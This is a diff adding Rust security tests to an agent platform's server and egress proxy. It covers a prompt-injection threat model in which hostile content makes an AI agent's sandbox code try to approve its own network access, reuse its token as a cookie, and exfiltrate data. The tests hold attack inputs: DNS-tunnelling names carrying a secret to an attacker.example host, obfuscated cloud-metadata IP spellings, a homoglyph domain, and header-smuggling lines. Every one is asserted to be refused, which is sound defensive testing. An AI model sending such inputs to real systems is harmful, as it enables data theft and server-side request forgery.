@@ -2724,3 +2724,537 @@ async fn the_lost_call_job_closes_calls_once_and_ends_every_call_while_sandboxes
         StatusCode::UNAUTHORIZED
     );
 }
+
+// ---------------------------------------------------------------------------------------------
+// Phase 9: prompt injection. Hostile content (a web page, a file, a chat message, tool output) makes the agent's
+// sandbox code try each of these with what it has: the call token, the proxy password and its own network. The
+// server and the proxy must refuse every one, whatever the model does.
+
+impl Fixture {
+    /// A request with any headers (sandbox code may send whatever it likes).
+    async fn raw(
+        &self,
+        method: &str,
+        uri: &str,
+        headers: &[(&str, &str)],
+        body: Option<Value>,
+    ) -> (StatusCode, Value) {
+        let mut builder = Request::builder().method(method).uri(uri);
+        for (name, value) in headers {
+            builder = builder.header(*name, *value);
+        }
+        let request = match body {
+            Some(value) => builder
+                .header(header::CONTENT_TYPE, "application/json")
+                .body(Body::from(value.to_string())),
+            None => builder.body(Body::empty()),
+        }
+        .unwrap();
+        let response = self.app.clone().oneshot(request).await.unwrap();
+        let status = response.status();
+        let bytes = to_bytes(response.into_body(), usize::MAX).await.unwrap();
+        (
+            status,
+            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
+        )
+    }
+}
+
+#[tokio::test]
+async fn injection_the_call_token_cannot_answer_its_own_card_make_rules_or_leave_its_scope() {
+    let fixture = Fixture::new().await;
+    // The worst case: the driver is the owner, so the driver's own rights would allow everything.
+    let driver = fixture.owner().await;
+    let agent = fixture.add_agent(TOOLS, true).await;
+    let profile = profile_of(&fixture, agent).await;
+    let thread = fixture.thread(agent, driver, "running").await;
+    let (call, token, password) = fixture.call(driver, agent, &thread).await;
+    let asked = fixture
+        .check(&call, &password, "evil.example.net", 443)
+        .await;
+    assert_eq!(asked["decision"], "ask");
+    let request = asked["request_id"].as_str().unwrap().to_owned();
+    let ws = &fixture.workspace_id;
+    let bearer = format!("Bearer {token}");
+
+    // With the token as a bearer: the scope layer refuses every route about access, rules, the card or settings.
+    for (method, uri, body) in [
+        (
+            "POST",
+            format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
+            Some(json!({ "answer": "allow_once" })),
+        ),
+        (
+            "POST",
+            format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
+            Some(json!({ "answer": "allow_always" })),
+        ),
+        (
+            "GET",
+            format!(
+                "/api/v1/workspaces/{ws}/agents/egress-requests?conversation_id={}",
+                fixture.conversation
+            ),
+            None,
+        ),
+        (
+            "POST",
+            format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules"),
+            Some(json!({ "host": "evil.example.net", "port": 443, "action": "allow" })),
+        ),
+        (
+            "PUT",
+            format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
+            Some(
+                json!({ "enabled": true, "idle_minutes": 30, "cpu_minutes_month": 100000, "egress_bytes_month": 1, "model_tokens_month": 1 }),
+            ),
+        ),
+        (
+            "GET",
+            format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
+            None,
+        ),
+        (
+            "GET",
+            format!("/api/v1/workspaces/{ws}/agent-integrations"),
+            None,
+        ),
+        ("GET", format!("/api/v1/workspaces/{ws}/agent-skills"), None),
+        ("GET", format!("/api/v1/workspaces/{ws}/audit"), None),
+        (
+            "GET",
+            format!("/api/v1/workspaces/{}/tasks", Id::new_v7()),
+            None,
+        ),
+        ("GET", "/api/v1/me".to_owned(), None),
+    ] {
+        let (status, value) = fixture.request(method, &uri, &bearer, body).await;
+        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {uri}: {value}");
+        assert_eq!(value["code"], "agent_scope", "{method} {uri}");
+    }
+    // Orbit's internal routes take service keys only.
+    for (uri, body) in [
+        (
+            "/api/internal/agent/egress/check".to_owned(),
+            json!({ "call_id": call, "proxy_password": password, "host": "evil.example.net", "port": 443 }),
+        ),
+        (
+            "/api/internal/agent/sandbox/calls".to_owned(),
+            json!({ "workspace_id": ws, "user_id": driver.to_string(), "agent_user_id": agent.to_string(), "thread_key": thread }),
+        ),
+        (
+            format!("/api/internal/agent/sandbox/calls/{call}/end"),
+            json!({ "exit": 0, "cpu_ms": 0 }),
+        ),
+    ] {
+        let (status, value) = fixture.request("POST", &uri, &bearer, Some(body)).await;
+        assert!(
+            matches!(status, StatusCode::FORBIDDEN | StatusCode::UNAUTHORIZED),
+            "{uri}: {status} {value}"
+        );
+    }
+
+    // With the token as a session cookie (no bearer, an Origin like the browser app's): refused too, before any
+    // route reads the cookie. Before phase 9 this answered the card as the owner.
+    let card = format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}");
+    for cookie in [
+        format!("__Host-orbit_session={token}"),
+        format!("orbit_session_dev={token}"),
+        format!("theme=dark; __Host-orbit_session={token}"),
+    ] {
+        for answer in ["allow_once", "allow_always"] {
+            let (status, value) = fixture
+                .raw(
+                    "POST",
+                    &card,
+                    &[
+                        ("cookie", cookie.as_str()),
+                        ("origin", "https://orbit.example.com"),
+                    ],
+                    Some(json!({ "answer": answer })),
+                )
+                .await;
+            assert_eq!(
+                status,
+                StatusCode::UNAUTHORIZED,
+                "{cookie} {answer}: {value}"
+            );
+        }
+        let (status, _) = fixture
+            .raw(
+                "GET",
+                &format!("/api/v1/workspaces/{ws}/tasks"),
+                &[("cookie", cookie.as_str())],
+                None,
+            )
+            .await;
+        assert_eq!(status, StatusCode::UNAUTHORIZED, "{cookie}");
+        // A cookie next to a valid bearer does not win either.
+        let (status, _) = fixture
+            .raw(
+                "POST",
+                &card,
+                &[
+                    ("cookie", cookie.as_str()),
+                    ("authorization", bearer.as_str()),
+                ],
+                Some(json!({ "answer": "allow_once" })),
+            )
+            .await;
+        assert_eq!(status, StatusCode::UNAUTHORIZED, "{cookie} with a bearer");
+    }
+    // A person's own cookie still works (the browser app).
+    let person = fixture.session(driver).await;
+    let (status, value) = fixture
+        .raw(
+            "GET",
+            &format!("/api/v1/workspaces/{ws}/tasks"),
+            &[("cookie", format!("__Host-orbit_session={person}").as_str())],
+            None,
+        )
+        .await;
+    assert_eq!(status, StatusCode::OK, "{value}");
+
+    // Nothing changed: the card waits for the driver, no rule, no continuation, no audit row.
+    let status: String =
+        sqlx::query_scalar("SELECT status FROM agent_egress_requests WHERE id = $1")
+            .bind(&request)
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(status, "pending");
+    let rules: i64 =
+        sqlx::query_scalar("SELECT COUNT(*) FROM agent_egress_rules WHERE agent_user_id = $1")
+            .bind(agent.to_string())
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(rules, 0);
+    assert!(fixture.continuations(&thread).await.is_empty());
+    let audits: i64 =
+        sqlx::query_scalar("SELECT COUNT(*) FROM audit_events WHERE action LIKE 'agent_egress.%'")
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(audits, 0);
+    assert_eq!(
+        fixture
+            .check(&call, &password, "evil.example.net", 443)
+            .await["decision"],
+        "ask"
+    );
+}
+
+#[tokio::test]
+async fn injection_a_sandbox_call_acts_only_in_its_own_thread() {
+    let fixture = Fixture::new().await;
+    let driver = fixture.add_user("driver", Some("member")).await;
+    let agent = fixture
+        .add_agent(r#"["move_to_trash", "sandbox_shell"]"#, true)
+        .await;
+    let thread = fixture.thread(agent, driver, "running").await;
+    let (_, token, _) = fixture.call(driver, agent, &thread).await;
+    let trash = format!(
+        "/api/v1/workspaces/{}/agent-tools/trash",
+        fixture.workspace_id
+    );
+    let bearer = format!("Bearer {token}");
+    let body = |conversation: Value, root: Value| json!({ "tool": "move_to_trash", "arguments": { "task_ids": [] }, "conversation_id": conversation, "root_message_id": root });
+
+    // Another conversation (the driver says "yes" there to someone else), another thread of the same conversation,
+    // or no thread at all: refused before the route looks for a yes.
+    let other = Id::new_v7().to_string();
+    for wrong in [
+        body(json!(other), Value::Null),
+        body(json!(fixture.conversation), json!(Id::new_v7().to_string())),
+        json!({ "tool": "move_to_trash", "arguments": {} }),
+        json!([fixture.conversation]),
+    ] {
+        let (status, value) = fixture
+            .request("POST", &trash, &bearer, Some(wrong.clone()))
+            .await;
+        assert_eq!(status, StatusCode::FORBIDDEN, "{wrong}: {value}");
+        assert_eq!(value["code"], "agent_scope", "{wrong}");
+    }
+    // Its own thread passes the scope layer (the route then judges the call itself).
+    let (status, value) = fixture
+        .request(
+            "POST",
+            &trash,
+            &bearer,
+            Some(body(json!(fixture.conversation), Value::Null)),
+        )
+        .await;
+    assert_ne!(value["code"], "agent_scope", "{status} {value}");
+
+    // The sidecar's own agent session (no sandbox call) is not bound here: the sidecar names the run's thread.
+    let session = Id::new_v7().to_string();
+    let sidecar_token = format!("orbit-agent.{}", orbit_platform::generate_opaque_token());
+    let now = TimestampMillis::now().as_millis();
+    sqlx::query(
+        "INSERT INTO sessions (id, token_hash, user_id, created_at, last_activity_at, idle_expires_at, \
+         absolute_expires_at) VALUES ($1, $2, $3, $4, $4, $5, $5)",
+    )
+    .bind(&session)
+    .bind(Sha256::digest(sidecar_token.as_bytes()).to_vec())
+    .bind(driver.to_string())
+    .bind(now)
+    .bind(now + 600_000)
+    .execute(fixture.database.pool())
+    .await
+    .unwrap();
+    sqlx::query(
+        "INSERT INTO agent_sessions (session_id, user_id, workspace_id, expires_at, agent_user_id) VALUES ($1, $2, $3, $4, $5)",
+    )
+    .bind(&session)
+    .bind(driver.to_string())
+    .bind(&fixture.workspace_id)
+    .bind(now + 600_000)
+    .bind(agent.to_string())
+    .execute(fixture.database.pool())
+    .await
+    .unwrap();
+    let (status, value) = fixture
+        .request(
+            "POST",
+            &trash,
+            &format!("Bearer {sidecar_token}"),
+            Some(body(json!(other), Value::Null)),
+        )
+        .await;
+    assert_ne!(value["code"], "agent_scope", "{status} {value}");
+}
+
+#[tokio::test]
+async fn injection_exfiltration_names_never_resolve_and_orbit_or_ip_targets_are_denied() {
+    let fixture = Fixture::new().await;
+    let driver = fixture.add_user("driver", Some("member")).await;
+    let agent = fixture.add_agent(TOOLS, true).await;
+    let thread = fixture.thread(agent, driver, "running").await;
+    let (call, token, password) = fixture.call(driver, agent, &thread).await;
+    fixture.rule(agent, "example.com", 443, "allow").await;
+    fixture.rule(agent, "webhook.site", 443, "allow").await; // made by hand: the routes refuse it
+    let running = proxy::start(&fixture, 100 * 1024 * 1024, 20).await;
+    proxy::call_file(running.calls.path(), &call, "127.0.0.1", &password);
+    let send = |line: String, extra: String| {
+        let (address, call, password) = (running.address, call.clone(), password.clone());
+        async move { proxy::send(address, "127.0.0.1", (&call, &password), &line, &extra).await }
+    };
+
+    // DNS tunnelling: the data rides in the name. Orbit asks; the proxy never looks the name up.
+    let secret = "orbit-agent-token-would-be-here".replace('-', "");
+    for host in [
+        format!("{secret}.attacker.example"),
+        format!("{secret}.example.com"),
+        "metadata.google.internal".to_owned(),
+    ] {
+        let (status, value, _) = send(format!("CONNECT {host}:443 HTTP/1.1"), String::new()).await;
+        assert_eq!(
+            (status, value["error"].as_str()),
+            (403, Some("egress_approval_required")),
+            "{host}"
+        );
+    }
+    // Risky hosts ask also with an allow rule, in any spelling; a look-alike of an allowed host is another host.
+    for host in ["WebHook.Site.", "x.webhook.site", "ex\u{0430}mple.com"] {
+        let (status, value, _) = send(format!("CONNECT {host}:443 HTTP/1.1"), String::new()).await;
+        assert_eq!(
+            (status, value["error"].as_str()),
+            (403, Some("egress_approval_required")),
+            "{host}"
+        );
+    }
+    // IP literals (metadata, mapped and other spellings) and Orbit's own names: denied.
+    for target in [
+        "169.254.169.254:443",
+        "[::ffff:169.254.169.254]:443",
+        "[fd00::1]:443",
+        "2852039166:443",
+        "0x7f.1:443",
+        "orbit.internal:443",
+        "orbit.internal:80",
+        "orbit.example.com:443",
+    ] {
+        let (status, value, _) = send(format!("CONNECT {target} HTTP/1.1"), String::new()).await;
+        assert_eq!(status, 403, "{target}: {value}");
+        assert_ne!(value["error"], "egress_approval_required", "{target}");
+    }
+    assert!(
+        running.dialer.resolved.lock().unwrap().is_empty(),
+        "a name was looked up before a yes"
+    );
+    assert!(running.dialer.connected.lock().unwrap().is_empty());
+
+    // Through orbit.internal: a bare line break cannot add a header, and the token as a cookie is refused.
+    let tasks = format!(
+        "GET http://orbit.internal/api/v1/workspaces/{}/tasks HTTP/1.1",
+        fixture.workspace_id
+    );
+    let (status, _, _) = send(
+        tasks.clone(),
+        format!("Authorization: Bearer {token}\nX-Forwarded-For: 1.2.3.4\r\n"),
+    )
+    .await;
+    assert_eq!(status, 0, "the proxy closes a head with a bare LF");
+    let (status, _, _) = send(
+        tasks.clone(),
+        format!("Cookie: __Host-orbit_session={token}\r\n"),
+    )
+    .await;
+    assert_eq!(status, 401);
+    let (status, _, _) = send(tasks, format!("Authorization: Bearer {token}\r\n")).await;
+    assert_eq!(status, 200);
+    // Routes without a session (registration and reset mails to any address, sign-in guesses) are not reachable:
+    // the proxy wants the call token, and Orbit's scope layer keeps an agent token in its workspace.
+    for (line, auth) in [
+        (
+            "POST http://orbit.internal/api/v1/auth/register HTTP/1.1",
+            String::new(),
+        ),
+        (
+            "POST http://orbit.internal/api/v1/auth/login HTTP/1.1",
+            "Authorization: Bearer x\r\n".to_owned(),
+        ),
+        (
+            "POST http://orbit.internal/api/v1/auth/password/forgot HTTP/1.1",
+            format!("Authorization: Basic {token}\r\n"),
+        ),
+    ] {
+        let (status, value, _) =
+            send(line.to_owned(), format!("{auth}Content-Length: 0\r\n")).await;
+        assert_eq!(
+            (status, value["error"].as_str()),
+            (401, Some("agent_token_required")),
+            "{line}"
+        );
+    }
+    let (status, value, _) = send(
+        "POST http://orbit.internal/api/v1/auth/register HTTP/1.1".to_owned(),
+        format!("Authorization: Bearer {token}\r\nContent-Length: 0\r\n"),
+    )
+    .await;
+    assert_eq!((status, value["code"].as_str()), (403, Some("agent_scope")));
+}
+
+#[tokio::test]
+async fn an_owner_of_another_workspace_cannot_read_answer_or_manage_this_ones_sandbox() {
+    let fixture = Fixture::new().await;
+    let driver = fixture.add_user("driver", Some("member")).await;
+    let agent = fixture.add_agent(TOOLS, true).await;
+    let profile = profile_of(&fixture, agent).await;
+    let thread = fixture.thread(agent, driver, "running").await;
+    let (call, _, password) = fixture.call(driver, agent, &thread).await;
+    let request = fixture
+        .check(&call, &password, "api.example.net", 443)
+        .await["request_id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let rule: String = {
+        fixture.rule(agent, "rule.example.net", 443, "allow").await;
+        sqlx::query_scalar("SELECT id FROM agent_egress_rules WHERE agent_user_id = $1")
+            .bind(agent.to_string())
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap()
+    };
+
+    // Workspace B and its owner (not a member of this one). The workspace and its owner membership reference each
+    // other (deferred foreign key): one transaction.
+    let other_ws = Id::new_v7().to_string();
+    let membership = Id::new_v7().to_string();
+    let now = TimestampMillis::now().as_millis();
+    let stranger = fixture.add_user("stranger", None).await;
+    let mut tx = fixture.database.immediate_transaction().await.unwrap();
+    sqlx::query(
+        "INSERT INTO workspaces (id, name, owner_membership_id, created_at, updated_at) VALUES ($1, 'Other', $2, $3, $3)",
+    )
+    .bind(&other_ws)
+    .bind(&membership)
+    .bind(now)
+    .execute(&mut *tx)
+    .await
+    .unwrap();
+    sqlx::query(
+        "INSERT INTO memberships (id, workspace_id, user_id, role, created_at, updated_at) \
+         VALUES ($1, $2, $3, 'owner', $4, $4)",
+    )
+    .bind(&membership)
+    .bind(&other_ws)
+    .bind(stranger.to_string())
+    .bind(now)
+    .execute(&mut *tx)
+    .await
+    .unwrap();
+    tx.commit().await.unwrap();
+    let bearer = format!("Bearer {}", fixture.session(stranger).await);
+
+    for ws in [fixture.workspace_id.as_str(), other_ws.as_str()] {
+        for (method, uri, body) in [
+            (
+                "POST",
+                format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
+                Some(json!({ "answer": "allow_always" })),
+            ),
+            (
+                "POST",
+                format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
+                Some(json!({ "answer": "deny", "always": true })),
+            ),
+            (
+                "GET",
+                format!(
+                    "/api/v1/workspaces/{ws}/agents/egress-requests?conversation_id={}",
+                    fixture.conversation
+                ),
+                None,
+            ),
+            (
+                "GET",
+                format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
+                None,
+            ),
+            (
+                "PUT",
+                format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
+                Some(
+                    json!({ "enabled": false, "idle_minutes": 30, "cpu_minutes_month": 1, "egress_bytes_month": 1, "model_tokens_month": 1 }),
+                ),
+            ),
+            (
+                "POST",
+                format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules"),
+                Some(json!({ "host": "x.example.net", "port": 443, "action": "allow" })),
+            ),
+            (
+                "DELETE",
+                format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules/{rule}"),
+                None,
+            ),
+        ] {
+            let (status, value) = fixture.request(method, &uri, &bearer, body).await;
+            assert_eq!(status, StatusCode::NOT_FOUND, "{method} {uri}: {value}");
+        }
+    }
+    let status: String =
+        sqlx::query_scalar("SELECT status FROM agent_egress_requests WHERE id = $1")
+            .bind(&request)
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(status, "pending");
+    let rules: i64 =
+        sqlx::query_scalar("SELECT COUNT(*) FROM agent_egress_rules WHERE agent_user_id = $1")
+            .bind(agent.to_string())
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(rules, 1);
+    let enabled: i64 =
+        sqlx::query_scalar("SELECT enabled FROM agent_sandbox_settings WHERE agent_user_id = $1")
+            .bind(agent.to_string())
+            .fetch_one(fixture.database.pool())
+            .await
+            .unwrap();
+    assert_eq!(enabled, 1);
+}
